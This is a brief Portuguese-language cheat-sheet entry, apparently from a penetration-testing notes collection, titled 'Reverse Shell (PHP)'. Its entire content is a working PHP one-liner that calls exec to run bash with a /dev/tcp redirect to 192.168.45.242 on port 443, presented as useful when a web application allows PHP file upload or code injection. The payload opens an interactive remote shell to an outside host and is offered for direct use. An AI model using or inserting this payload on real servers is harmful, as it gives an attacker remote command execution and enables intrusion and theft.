---
title: "Reverse Shell (PHP)"
---

# Reverse Shell (PHP)

One-liner PHP que executa um reverse shell bash. Útil quando há upload de arquivos PHP ou injeção de código em aplicações web.

```shell
<?php exec("bash -c 'bash -i >& /dev/tcp/192.168.45.242/443 0>&1'"); ?>
```
